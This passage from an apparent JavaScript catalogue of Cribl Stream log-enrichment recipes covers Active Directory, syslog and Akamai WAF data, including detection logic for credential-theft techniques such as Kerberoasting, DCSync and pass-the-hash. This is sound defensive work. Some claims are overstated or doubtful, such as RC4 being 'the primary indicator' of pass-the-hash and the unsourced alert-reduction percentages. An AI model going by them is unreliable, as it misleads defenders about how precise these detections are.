          notes: 'Requires pre-computed baseline dataset (daily aggregation job). The p95_ratio > 2.0 means current latency is 2x worse than historical average — investigate.'
        }
      }
    ]
  },
  'active-directory': {
    streamTime: [
      {
        name: 'Account Type Classification',
        description: 'Classify target_username and subject_username as: domain-admin, privileged-service, standard-service, standard-user, computer-account, or built-in based on group membership and naming conventions.',
        criblFunction: 'Lookup',
        addedFields: ['target_account_type', 'subject_account_type', 'target_is_privileged', 'target_is_service_account'],
        securityValue: 'Enables priority-based alerting: attacks against domain-admin accounts are critical, against standard-users are high, against computer-accounts are medium. Reduces SOC alert fatigue by 40-60% through context-appropriate severity assignment.',
        observabilityValue: 'Enables authentication breakdown by account type, identifies service account sprawl, tracks privileged account usage patterns for access review.',
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Compliance'],
        implementation: {
          lookupSample: 'username,account_type,is_privileged,is_service_account,tier\nAdministrator,domain-admin,true,false,0\nkrbtgt,built-in,true,false,0\nYOURDC01$,computer-account,false,false,1\nsvc-sql-prod,privileged-service,true,true,1\njsmith,standard-user,false,false,2',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: ad_account_types.csv\n// Input: target_username → username (case-insensitive)\n// Output: account_type → target_account_type, is_privileged → target_is_privileged, is_service_account → target_is_service_account\n//\n// Also apply to subject_username → subject_account_type\n//\n// Result: { target_username: "svc-sql-prod", target_account_type: "privileged-service", target_is_privileged: "true", target_is_service_account: "true" }',
          notes: 'Generate from: Get-ADUser -Filter * -Properties MemberOf | classify based on group membership. Domain Admins/Enterprise Admins = tier-0. Update after group membership changes.'
        }
      },
      {
        name: 'EventID to MITRE ATT&CK Mapping',
        description: 'Automatically tag AD events with MITRE ATT&CK technique IDs based on EventID and contextual fields (e.g., 4769+RC4→T1558.003 Kerberoasting).',
        criblFunction: 'Lookup',
        addedFields: ['mitre_technique_id', 'mitre_technique_name', 'mitre_tactic', 'attack_confidence'],
        securityValue: 'Pre-maps events to the detection framework at ingest time, enabling instant MITRE coverage dashboards and automated technique-based correlation. Analysts see "T1558.003 Kerberoasting" instead of "Event 4769" in their queue.',
        observabilityValue: 'Enables attack surface measurement: "which MITRE techniques do we have detection coverage for?" without requiring SIEM-side correlation.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response'],
        implementation: {
          lookupSample: 'event_id,context,technique_id,technique_name,tactic,confidence\n4769,ticket_encryption==0x17,T1558.003,Kerberoasting,Credential Access,high\n4662,replication_rights,T1003.006,DCSync,Credential Access,critical\n4728,,T1098,Account Manipulation,Persistence,medium\n4625,,T1110,Brute Force,Credential Access,low\n4768,ticket_options==forwardable,T1558.001,Golden Ticket,Credential Access,medium',
          example: '// Cribl Stream → Processing → Lookup + Eval\n// Step 1: Lookup by event_id for base mapping\n// Lookup File: ad_mitre_mapping.csv\n// Input: event_id → event_id (exact match)\n// Output: technique_id → mitre_technique_id, technique_name → mitre_technique_name, tactic → mitre_tactic\n//\n// Step 2: Eval for context-specific upgrades\n// if (event_id==4769 && ticket_encryption==\'0x17\') { attack_confidence = \'high\'; mitre_technique_id = \'T1558.003\'; }\n// if (event_id==4662 && replication_source != \'\') { attack_confidence = \'critical\'; mitre_technique_id = \'T1003.006\'; }\n//\n// Result: { event_id: 4769, ticket_encryption: "0x17", mitre_technique_id: "T1558.003", mitre_technique_name: "Kerberoasting", attack_confidence: "high" }',
          notes: 'Base mapping covers all EventIDs. Context-specific overrides increase confidence when additional fields match attack indicators (e.g., RC4 encryption for Kerberoasting).'
        }
      },
      {
        name: 'Source IP Context Enrichment',
        description: 'Enrich source_ip with asset metadata: hostname, host role (DC, member server, workstation, VPN), network segment, and owning user from CMDB/DHCP.',
        criblFunction: 'Lookup',
        addedFields: ['source_host_role', 'source_network_segment', 'source_assigned_user', 'source_is_dc'],
        securityValue: 'Immediately identifies lateral movement sources and destinations. "Workstation authenticating to DC with NTLM" is normal; "Server authenticating to DC with replication rights" is DCSync. Context eliminates 80%+ of false positives.',
        observabilityValue: 'Enables authentication flow analysis by source type, identifies which network segments generate the most AD traffic, supports capacity planning for DC placement.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Platform Engineering'],
        implementation: {
          lookupSample: 'ip,host_role,network_segment,assigned_user,is_dc\n10.1.1.10,domain-controller,dc-subnet,n/a,true\n10.1.2.50,workstation,user-vlan,jsmith,false\n10.1.3.100,server,server-vlan,n/a,false\n10.100.5.42,vpn-client,vpn-pool,remote-user,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: network_assets.csv\n// Input: source_ip → ip (exact match or CIDR)\n// Output: host_role → source_host_role, network_segment → source_network_segment, assigned_user → source_assigned_user, is_dc → source_is_dc\n//\n// Result: { source_ip: "10.1.2.50", source_host_role: "workstation", source_network_segment: "user-vlan", source_is_dc: "false" }\n// Critical check: if event_id==4662 (replication) AND source_is_dc=="false" → DCSync attack from non-DC!',
          notes: 'The is_dc field is critical — any replication request (Event 4662) from a non-DC source is an immediate DCSync alert. Also used for lateral movement context.'
        }
      },
      {
        name: 'Failure Code Resolution',
        description: 'Map Windows sub-status/failure codes (0xC000006A, 0xC0000234, 0xC0000072) to human-readable descriptions and recommended remediation actions.',
        criblFunction: 'Lookup',
        addedFields: ['failure_description', 'failure_category', 'failure_remediation', 'failure_is_security_relevant'],
        securityValue: 'Analysts immediately understand why authentication failed without memorizing hex status codes. "0xC000006A = Bad Password" vs "0xC0000234 = Account Locked Out" enables faster triage and appropriate response selection.',
        observabilityValue: 'Enables failure-reason dashboards for helpdesk and identity team: "Top reasons users can\'t log in today" without requiring Windows expertise to interpret codes.',
        personas: ['SOC', 'Identity Team', 'Helpdesk', 'Security Engineering'],
        implementation: {
          lookupSample: 'code,description,category,remediation,is_security_relevant\n0xC000006A,Bad Password,credential-error,Verify password or reset,true\n0xC0000234,Account Locked Out,lockout,Check lockout source and unlock,true\n0xC0000072,Account Disabled,disabled-account,Verify account status in AD,true\n0xC000006D,Logon Failure (generic),credential-error,Check all auth factors,true\n0xC0000064,User Does Not Exist,invalid-account,Possible enumeration attempt,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: windows_failure_codes.csv\n// Input: failure_reason → code (exact match, case-insensitive)\n// Output: description → failure_description, category → failure_category, remediation → failure_remediation, is_security_relevant → failure_is_security_relevant\n//\n// Result: { failure_reason: "0xC000006A", failure_description: "Bad Password", failure_category: "credential-error", failure_is_security_relevant: "true" }',
          notes: 'Full list of NTSTATUS codes: ~50 auth-related codes. Include all sub-status codes from Event 4625. Analysts immediately see "Bad Password" instead of memorizing hex codes.'
        }
      },
      {
        name: 'Kerberos Encryption Assessment',
        description: 'Evaluate ticket_encryption type against security policy: flag RC4 (0x17) as legacy/risky, classify AES256 (0x12) as compliant, and detect encryption downgrade patterns.',
        criblFunction: 'Eval',
        addedFields: ['encryption_compliant', 'encryption_risk_level', 'encryption_name', 'potential_pass_the_hash'],
        securityValue: 'RC4 encryption in Kerberos tickets is the primary indicator of pass-the-hash and Kerberoasting attacks. Flagging at ingest time enables sub-second detection without requiring post-hoc SIEM correlation across thousands of Kerberos events.',
        observabilityValue: 'Tracks encryption adoption over time: "what percentage of our Kerberos traffic still uses RC4?" Informs legacy system remediation and crypto-agility roadmap.',
        personas: ['Security Engineering', 'SOC', 'Identity Team', 'Compliance'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// encryption_name = ticket_encryption == \'0x17\' ? \'RC4-HMAC\'\n//   : ticket_encryption == \'0x12\' ? \'AES256-CTS-HMAC-SHA1\'\n//   : ticket_encryption == \'0x11\' ? \'AES128-CTS-HMAC-SHA1\'\n//   : ticket_encryption == \'0x3\' ? \'DES-CBC-MD5\' : \'unknown\'\n//\n// encryption_compliant = (ticket_encryption == \'0x12\' || ticket_encryption == \'0x11\') ? \'true\' : \'false\'\n// encryption_risk_level = ticket_encryption == \'0x17\' ? \'high\' : ticket_encryption == \'0x3\' ? \'critical\' : \'low\'\n// potential_pass_the_hash = (ticket_encryption == \'0x17\' && target_account_type == \'privileged-service\') ? \'true\' : \'false\'\n//\n// Result: { ticket_encryption: "0x17", encryption_name: "RC4-HMAC", encryption_compliant: "false", encryption_risk_level: "high", potential_pass_the_hash: "true" }',
          notes: 'RC4 (0x17) in a modern environment almost always indicates pass-the-hash or Kerberoasting — legitimate Kerberos uses AES. DES (0x3) should never appear in production.'
        }
      },
      {
        name: 'Privileged Group Watch List',
        description: 'Tag events involving protected groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators) with elevated priority.',
        criblFunction: 'Lookup',
        addedFields: ['involves_protected_group', 'group_tier', 'group_change_requires_approval', 'group_members_expected_count'],
        securityValue: 'Any modification to Tier-0 groups is a critical security event regardless of who performed it. Pre-tagging enables instant escalation routing and bypasses normal alert thresholds.',
        observabilityValue: 'Tracks privileged group membership changes over time, enables access review evidence collection, identifies group membership drift from approved baselines.',
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Compliance'],
        implementation: {
          lookupSample: 'group_name,tier,change_requires_approval,expected_member_count,alert_on_any_change\nDomain Admins,0,true,5,true\nEnterprise Admins,0,true,3,true\nSchema Admins,0,true,1,true\nAccount Operators,1,true,8,true\nBackup Operators,1,true,4,true\nServer Operators,1,false,10,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: privileged_groups.csv\n// Input: group_name → group_name (case-insensitive)\n// Output: tier → group_tier, change_requires_approval → group_change_requires_approval, expected_member_count → group_members_expected_count, alert_on_any_change → involves_protected_group\n//\n// Filter: Only apply to events where event_id in (4728, 4732, 4756, 4729, 4733, 4757)\n//\n// Result: { group_name: "Domain Admins", involves_protected_group: "true", group_tier: "0", group_change_requires_approval: "true" }',
          notes: 'Tier-0 groups (Domain Admins, Enterprise Admins, Schema Admins) should ALWAYS alert on membership changes. Track expected_member_count to detect unauthorized additions.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Logon Session Timeline',
        description: 'Correlate logon (4624), privilege assignment (4672), and logoff (4634) events by logon_id to reconstruct complete session timelines with duration and privilege context.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['session_duration', 'session_privileges', 'session_activity_count', 'session_risk_score'],
        securityValue: 'Enables full session forensics: "User logged in at 02:00 with SeDebugPrivilege, performed 47 operations over 3 hours, then disconnected." Complete timeline in one query for incident response.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC', 'Compliance'],
        implementation: {
          example: '// Cribl Search session correlation:\n// dataset="ad_security_logs" target_username=="jsmith" event_id in (4624, 4672, 4634) earliest=-8h\n// | extend event_type = iif(event_id==4624, "logon", iif(event_id==4672, "privilege-assigned", "logoff"))\n// | order by timestamp asc\n// | summarize session_start=minif(timestamp, event_id==4624), session_end=maxif(timestamp, event_id==4634),\n//     privileges=makeset(iif(event_id==4672, privilege_list, "")), activity_count=count()\n//   by logon_id, target_username, source_ip, logon_type\n// | extend session_duration_min = datetime_diff(\'minute\', session_end, session_start)',
          notes: 'logon_id is the correlation key across logon/privilege/logoff events. Sessions without a 4634 (logoff) may indicate abnormal termination or missing logs.'
        }
      },
      {
        name: 'Authentication Baseline Deviation',
        description: 'Compare current authentication patterns (volume, timing, source, type) against per-user 30-day baselines to identify statistical anomalies.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['baseline_daily_logons', 'baseline_typical_hours', 'baseline_typical_sources', 'deviation_score'],
        securityValue: 'Detects compromised accounts through behavioral analysis: "This account normally authenticates from 3 workstations between 8am-6pm, but today it authenticated from 15 servers at 2am." Adapts to individual patterns without manual tuning.',
        personas: ['Threat Hunting', 'Security Engineering', 'SOC'],
        implementation: {
          example: '// Cribl Search behavioral analysis:\n// dataset="ad_security_logs" event_id==4624 target_username=="$USER" earliest=-1d\n// | summarize today_logins=count(), today_hosts=dcount(source_ip), today_dcs=dcount(computer) by target_username\n// | join kind=left (\n//     dataset="ad_baselines"\n//     | where username=="$USER"\n//     | project baseline_daily_logins, baseline_typical_hours, baseline_typical_sources\n//   ) on target_username=username\n// | extend login_deviation = round((today_logins - baseline_daily_logins) / baseline_daily_logins * 100, 1)\n// | extend host_deviation = round((today_hosts - baseline_typical_sources) / baseline_typical_sources * 100, 1)',
          notes: 'Requires baseline dataset computed from 30-day rolling averages per user. Deviations > 200% warrant investigation. Account for known patterns (month-end processing, patching windows).'
        }
      }
    ]
  },
  'linux-syslog': {
    streamTime: [
      {
        name: 'Severity-to-Priority Mapping',
        description: 'Map syslog severity levels to operational priority tiers (P1-P4) based on facility+severity combinations and service criticality.',
        criblFunction: 'Eval',
        addedFields: ['ops_priority', 'alert_tier', 'escalation_required'],
        securityValue: 'Ensures critical kernel security events (facility=kern, severity=crit) are immediately routed to security tier regardless of log volume. Prevents security events from being buried in noise.',
        observabilityValue: 'Enables SLA-aligned alerting: P1 events page immediately, P2 create tickets, P3/P4 aggregate to dashboards. Standardizes response urgency across all syslog sources.',
        personas: ['NOC', 'Platform Engineering', 'SOC', 'SRE'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// ops_priority = (severity==\'emerg\' || severity==\'alert\') ? \'P1\'\n//   : (severity==\'crit\') ? \'P2\'\n//   : (severity==\'err\') ? \'P3\' : \'P4\'\n//\n// alert_tier = (facility==\'kern\' && severity in (\'emerg\',\'alert\',\'crit\')) ? \'immediate\'\n//   : (severity in (\'emerg\',\'alert\')) ? \'immediate\'\n//   : (severity == \'crit\') ? \'urgent\' : \'standard\'\n//\n// escalation_required = (ops_priority==\'P1\' || (facility==\'kern\' && severity==\'crit\')) ? \'true\' : \'false\'\n//\n// Result: { facility: "kern", severity: "crit", ops_priority: "P2", alert_tier: "immediate", escalation_required: "true" }',
          notes: 'Customize priority mapping for your environment. Some teams want kern.crit as P1, others as P2. The key is standardizing across all syslog sources.'
        }
      },
      {
        name: 'Service Dependency Mapping',
        description: 'Enrich systemd_unit with upstream/downstream dependencies, service tier, and owning team from service catalog.',
        criblFunction: 'Lookup',
        addedFields: ['service_tier', 'service_owner_team', 'service_dependencies', 'service_dependents'],
        securityValue: 'When a security-critical service (firewalld, auditd, ossec) stops, immediately identifies blast radius — what other services depend on it and what protections are now degraded.',
        observabilityValue: 'Enables cascading failure analysis: when service A fails, automatically identify all downstream services at risk. Critical for incident response prioritization and blast radius estimation.',
        personas: ['NOC', 'SRE', 'Platform Engineering', 'SOC'],
        implementation: {
          lookupSample: 'unit,service_tier,owner_team,dependencies,dependents\nnginx.service,Tier-1,platform-team,network.target,none\npostgresql.service,Tier-1,dba-team,network.target,app-api.service\napp-api.service,Tier-2,api-team,postgresql.service;redis.service,nginx.service\nauditd.service,Tier-1,security-ops,none,none',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: systemd_service_catalog.csv\n// Input: systemd_unit → unit (exact match)\n// Output: service_tier, owner_team → service_owner_team, dependencies → service_dependencies, dependents → service_dependents\n//\n// Result: { systemd_unit: "postgresql.service", service_tier: "Tier-1", service_owner_team: "dba-team", service_dependents: "app-api.service" }\n// When postgresql fails, immediately know: app-api.service is impacted, escalate to dba-team',
          notes: 'Generate from: systemctl list-dependencies --reverse for each critical service. Map to owning team from your service catalog. Enables blast radius assessment.'
        }
      },
      {
        name: 'Host Role and Environment Tagging',
        description: 'Tag syslog events with host role (web, db, cache, queue) and environment (prod, staging, dev) based on hostname pattern or CMDB lookup.',
        criblFunction: 'Lookup',
        addedFields: ['host_role', 'host_environment', 'host_region', 'host_cluster'],
        securityValue: 'Enables environment-aware detection rules: OOM kills in prod are incidents, in dev they are expected during load testing. Reduces alert noise by 30-50% through context-appropriate thresholds.',
        observabilityValue: 'Enables per-environment health dashboards, regional comparison views, and cluster-level aggregation. Foundation for meaningful SLO tracking per service tier.',
        personas: ['NOC', 'SRE', 'Platform Engineering', 'Security Engineering'],
        implementation: {
          lookupSample: 'hostname_pattern,role,environment,region,cluster\nweb-prod-*,web-server,production,us-east-1,web-cluster-1\ndb-prod-*,database,production,us-east-1,db-cluster-1\ndev-*,development,development,us-west-2,dev-cluster\nmonitoring-*,monitoring,infrastructure,us-east-1,ops-cluster',
          example: '// Cribl Stream → Processing → Lookup Function (wildcard match)\n// Lookup File: host_roles.csv\n// Input: hostname → hostname_pattern (wildcard match)\n// Output: role → host_role, environment → host_environment, region → host_region, cluster → host_cluster\n//\n// Result: { hostname: "web-prod-03", host_role: "web-server", host_environment: "production", host_region: "us-east-1" }',
          notes: 'Same host role lookup used for auditd enrichment. One file, multiple pipeline consumers. Enables environment-appropriate alert thresholds (OOM in prod = P1, in dev = P4).'
        }
      },
      {
        name: 'Disk Health Enrichment',
        description: 'Enrich disk_device field with disk model, age, SMART status history, and predicted failure date from hardware inventory.',
        criblFunction: 'Lookup',
        addedFields: ['disk_model', 'disk_age_days', 'disk_smart_status', 'disk_predicted_failure'],
        securityValue: 'Minimal direct security value, but disk failures can impact forensic evidence preservation and log integrity. Useful for ensuring security logging infrastructure remains healthy.',
        observabilityValue: 'Enables proactive disk replacement before failure. Correlating error rate with disk age and SMART data creates actionable maintenance windows rather than reactive firefighting.',
        personas: ['NOC', 'Platform Engineering', 'SRE', 'Data Center Ops'],
        implementation: {
          lookupSample: 'device,model,age_days,smart_status,predicted_failure\nsda,Samsung-860-EVO,730,healthy,none\nsdb,Seagate-ST4000,1095,degraded,2026-08-15\nnvme0n1,Intel-P4510,365,healthy,none',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: disk_inventory.csv\n// Input: disk_device → device (exact match)\n// Output: model → disk_model, age_days → disk_age_days, smart_status → disk_smart_status, predicted_failure → disk_predicted_failure\n//\n// Filter: Only apply when disk_device field is present (disk error events)\n//\n// Result: { disk_device: "sdb", disk_model: "Seagate-ST4000", disk_age_days: 1095, disk_smart_status: "degraded", disk_predicted_failure: "2026-08-15" }',
          notes: 'Populate from smartctl --all /dev/sdX across fleet. Schedule weekly collection via Cribl Edge. Disks with predicted_failure within 30 days = schedule replacement.'
        }
      },
      {
        name: 'OOM Context Enrichment',
        description: 'Enrich OOM killer events with process expected memory limits, container/pod context, and historical OOM frequency for the same process.',
        criblFunction: 'Lookup',
        addedFields: ['process_memory_limit', 'process_container', 'process_oom_history_count', 'process_expected_rss'],
        securityValue: 'Repeated OOM kills on security services (auditd, clamd, ossec-agent) create monitoring blind spots. Enrichment immediately flags when security tooling is resource-starved.',
        observabilityValue: 'Distinguishes legitimate memory growth (increased load) from memory leaks (gradual creep). History count shows whether this is a one-off or recurring pattern requiring code fix or resource increase.',
        personas: ['SRE', 'Platform Engineering', 'NOC', 'Application Development'],
        implementation: {
          lookupSample: 'process_name,memory_limit_mb,container,oom_history_count,expected_rss_mb\njava,4096,app-api-container,3,3500\npostgres,8192,,0,6000\nnginx,512,,0,200\npython3,2048,ml-worker,12,1800',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: process_memory_profiles.csv\n// Input: oom_process → process_name (exact match)\n// Output: memory_limit_mb → process_memory_limit, container → process_container, oom_history_count → process_oom_history_count, expected_rss_mb → process_expected_rss\n//\n// Filter: Only apply when oom_process field is present (OOM kill events)\n//\n// Result: { oom_process: "python3", process_memory_limit: "2048", process_container: "ml-worker", process_oom_history_count: "12" }\n// oom_history_count: 12 = recurring issue needing code fix, not just a resource increase',
          notes: 'Track OOM kill history via: journalctl -k | grep "Out of memory" | count by process. High oom_history_count = memory leak requiring developer attention, not just a bigger container.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Service Health Timeline',
        description: 'Aggregate systemd_unit events over time to build service health timelines: start→stable→degraded→failed→recovered, with duration at each state.',
        criblFunction: 'Search-time aggregation',
        addedFields: ['service_uptime', 'service_restart_count', 'mean_time_between_failures', 'current_state_duration'],
        securityValue: 'Identifies services that are being repeatedly stopped and started (potential tampering). Security services with low uptime indicate active interference.',
        observabilityValue: 'Foundation for SLO calculation: actual service availability vs target. Identifies services trending toward instability before they impact users. Enables MTBF/MTTR reporting per service.',
        personas: ['SRE', 'NOC', 'Platform Engineering', 'Management'],
        implementation: {
          example: '// Cribl Search service health analysis:\n// dataset="syslog_logs" systemd_unit=="postgresql.service" earliest=-7d\n// | where systemd_action in ("Started", "Stopped", "Failed")\n// | order by timestamp asc\n// | summarize restart_count=countif(systemd_action=="Started"), failures=countif(systemd_action=="Failed"),\n//     mean_time_between_failures=datetime_diff(\'hour\', max(timestamp), min(timestamp)) / iif(failures>0, failures, 1)\n//   by hostname, systemd_unit\n// | extend service_stability = iif(failures==0, "stable", iif(mean_time_between_failures > 24, "degraded", "unstable"))',
          notes: 'MTBF (Mean Time Between Failures) is the key SRE metric. Services with MTBF < 24h are "unstable" and need engineering attention. Track over time for SLO reporting.'
        }
      },
      {
        name: 'Cross-Host Failure Correlation',
        description: 'Join syslog events across multiple hosts to identify correlated failures (same error appearing on multiple hosts simultaneously indicating shared root cause).',
        criblFunction: 'Search-time dataset join',
        addedFields: ['affected_host_count', 'failure_correlation_id', 'probable_root_cause', 'shared_infrastructure'],
        securityValue: 'Mass service failures across multiple hosts simultaneously may indicate a coordinated attack (wiper malware, mass exploitation). Distinguishes targeted attack from infrastructure failure by correlation pattern.',
        observabilityValue: 'Identifies shared infrastructure failures: if 20 hosts report disk errors simultaneously, it is likely a SAN issue not individual disk failures. Dramatically reduces MTTR for infrastructure-level problems.',
        personas: ['NOC', 'SRE', 'Platform Engineering', 'Incident Response'],
        implementation: {
          example: '// Cribl Search cross-host correlation:\n// dataset="syslog_logs" severity in ("crit", "alert", "emerg") earliest=-1h\n// | summarize affected_hosts=dcount(hostname), total_errors=count(),\n//     hosts_list=makeset(hostname), processes=makeset(process)\n//   by message, systemd_unit\n// | where affected_hosts > 3\n// | extend probable_root_cause = iif(processes has "kernel", "infrastructure-failure",\n//     iif(affected_hosts > 10, "shared-dependency", "service-specific"))\n// | order by affected_hosts desc',
          notes: 'Same error on 3+ hosts simultaneously = shared infrastructure failure (SAN, NFS, DNS). Same error on 1 host = local issue. This distinction dramatically reduces MTTR.'
        }
      }
    ]
  },
  'akamai-waf': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context (country, city, ASN, organization) to client_ip for attack origin analysis and geographic access control.',
        criblFunction: 'GeoIP',
        addedFields: ['client_country', 'client_city', 'client_asn', 'client_org'],
        securityValue: 'Identifies attack traffic origin, enables geographic blocking recommendations, supports campaign attribution by correlating WAF attacks to known threat actor ASNs.',
        observabilityValue: 'Enables geographic traffic distribution dashboards, identifies which regions drive the most load, supports CDN edge node placement decisions.',
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'client_ip',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'client_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: client_ip\n// Output: client_country, client_city, client_asn, client_org\n// Filter: Only enrich when Akamai EdgeScape geo fields are empty\n//\n// Result: { client_ip: "198.51.100.42", client_country: "RU", client_city: "Moscow", client_asn: "AS48287", client_org: "Bulletproof Hosting Ltd" }',
          notes: 'Akamai provides native geo fields (country, city, region) — use GeoIP as fallback/validation. MaxMind adds ASN data not included in Akamai EdgeScape.'
        }
      },
      {
        name: 'IP Reputation Lookup',
        description: 'Enrich client_ip against threat intelligence feeds to identify known malicious infrastructure, Tor exits, residential proxies, and bulletproof hosting.',
        criblFunction: 'Lookup',
        addedFields: ['ip_threat_score', 'ip_threat_category', 'ip_is_tor', 'ip_is_proxy'],
        securityValue: 'Pre-flags attack traffic from known infrastructure before SIEM processing. Enables immediate escalation when WAF alerts come from confirmed threat actor IPs.',
        observabilityValue: 'Supports "attacks from flagged IPs per hour" operational dashboard metrics.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'threat_intel_iocs.csv',
            inputField: 'client_ip → indicator',
            outputFields: ['ip_threat_score', 'ip_threat_category', 'ip_is_tor', 'ip_is_proxy'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'indicator,threat_score,category,is_tor,is_proxy\n185.220.101.1,90,tor-exit,true,false\n198.51.100.50,70,residential-proxy,false,true\n203.0.113.100,95,credential-stuffing,false,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: threat_intel_iocs.csv\n// Input: client_ip → indicator (exact match)\n// Output: threat_score → ip_threat_score, category → ip_threat_category, is_tor → ip_is_tor, is_proxy → ip_is_proxy\n//\n// Result: { client_ip: "185.220.101.1", ip_threat_score: 90, ip_threat_category: "tor-exit", ip_is_tor: "true" }',
          notes: 'Include Tor exit node list, commercial VPN exits, residential proxy databases, and known credential-stuffing infrastructure. Reuse same threat intel file across all sources.'
        }
      },
      {
        name: 'WAF Rule Category Lookup',
        description: 'Map Akamai WAF rule_id to OWASP category, attack class, and severity using a lookup table.',
        criblFunction: 'Lookup',
        addedFields: ['owasp_category', 'attack_class', 'rule_severity'],
        securityValue: 'Converts opaque rule IDs into actionable classifications. Enables OWASP-category dashboards and attack-class-based routing without requiring analysts to memorize rule IDs.',
        observabilityValue: 'Minimal direct observability value, but supports WAF effectiveness reporting by attack category.',
        personas: ['Security Engineering', 'SOC', 'Application Security'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'akamai_rule_categories.csv',
            inputField: 'rule_id → rule_id',
            outputFields: ['owasp_category', 'attack_class', 'rule_severity'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'rule_id,owasp_category,attack_class,severity\n950002,A03-Injection,sql-injection,critical\n941100,A07-XSS,cross-site-scripting,high\n930110,A01-Broken-Access,path-traversal,high\n920350,A05-Security-Misconfig,protocol-violation,medium',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: akamai_rule_categories.csv\n// Input: rule_id → rule_id (exact match)\n// Output: owasp_category, attack_class, rule_severity\n//\n// Result: { rule_id: "950002", owasp_category: "A03-Injection", attack_class: "sql-injection", rule_severity: "critical" }',
          notes: 'Build from Akamai Kona Rule Set documentation. Map each rule to OWASP Top 10 2021 categories. Update when Akamai releases new rule sets.'
        }
      },
      {
        name: 'Bot Classification Eval',
        description: 'Classify bot traffic into actionable categories based on bot_score ranges and user_agent patterns.',
        criblFunction: 'Eval',
        addedFields: ['bot_tier', 'bot_risk_level', 'is_automated'],
        securityValue: 'Distinguishes good bots (search engines) from bad bots (credential stuffers, scrapers). Enables bot-specific detection rules and targeted mitigation recommendations.',
        observabilityValue: 'Supports bot traffic volume dashboards — track percentage of traffic that is automated vs human. Useful for capacity planning and CDN optimization.',
        personas: ['Security Engineering', 'SOC', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Bot score classification logic',
            outputField: 'bot_tier'
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// bot_tier = bot_score > 80 ? \'confirmed_bot\' : bot_score > 60 ? \'likely_bot\' : bot_score > 30 ? \'suspicious\' : \'likely_human\'\n// bot_risk_level = (bot_tier == \'confirmed_bot\' && bot_category != \'search_engine\') ? \'high\'\n//   : bot_tier == \'likely_bot\' ? \'medium\' : \'low\'\n// is_automated = bot_score > 50 ? \'true\' : \'false\'\n//\n// Result: { bot_score: 85, bot_category: "credential_stuffer", bot_tier: "confirmed_bot", bot_risk_level: "high", is_automated: "true" }',
          notes: 'Akamai Bot Manager provides bot_score natively. This enrichment adds actionable tiers for routing decisions. Exclude known good bots (Googlebot, Bingbot) from risk escalation.'
        }
      },
      {
        name: 'Attack Severity Scoring Eval',
        description: 'Calculate composite attack severity from rule_action, risk_score, bot_score, and rule count to produce a unified priority score.',
        criblFunction: 'Eval',
        addedFields: ['attack_severity', 'priority_score', 'escalation_required'],
        securityValue: 'Provides a single prioritization score combining multiple signals. Enables priority-based SIEM routing: critical attacks always forwarded, low severity sampled.',
        observabilityValue: 'Supports "attack severity distribution" metrics for security posture dashboards.',
        personas: ['SOC', 'Security Engineering', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Composite severity calculation',
            outputField: 'attack_severity'
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// priority_score = (rule_action == \'deny\' ? 40 : 20) + (risk_score * 0.4) + (bot_score > 70 ? 20 : 0)\n// attack_severity = priority_score > 80 ? \'critical\' : priority_score > 60 ? \'high\' : priority_score > 40 ? \'medium\' : \'low\'\n// escalation_required = attack_severity in (\'critical\', \'high\') ? \'true\' : \'false\'\n//\n// Result: { rule_action: "deny", risk_score: 85, bot_score: 90, priority_score: 94, attack_severity: "critical", escalation_required: "true" }',
          notes: 'Tune weights based on your environment. Some orgs weight bot_score higher (ecommerce), others weight rule_action higher (banking). Validate against known attack incidents.'
        }
      },
      {
        name: 'Application Mapping Lookup',
        description: 'Map request host header to application owner, team, environment, and criticality tier from service registry.',
        criblFunction: 'Lookup',
        addedFields: ['app_name', 'app_owner', 'app_team', 'app_criticality'],
        securityValue: 'Enables application-aware alert routing — attacks on Tier-1 applications get immediate escalation. Identifies app owner for rapid incident communication.',
        observabilityValue: 'Enables per-application traffic dashboards, team-based cost allocation, and service-level WAF effectiveness reporting.',
        personas: ['Security Engineering', 'SRE', 'Platform Engineering', 'Application Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'application_registry.csv',
            inputField: 'host → hostname',
            outputFields: ['app_name', 'app_owner', 'app_team', 'app_criticality'],
            reloadInterval: '1 hour'
          },
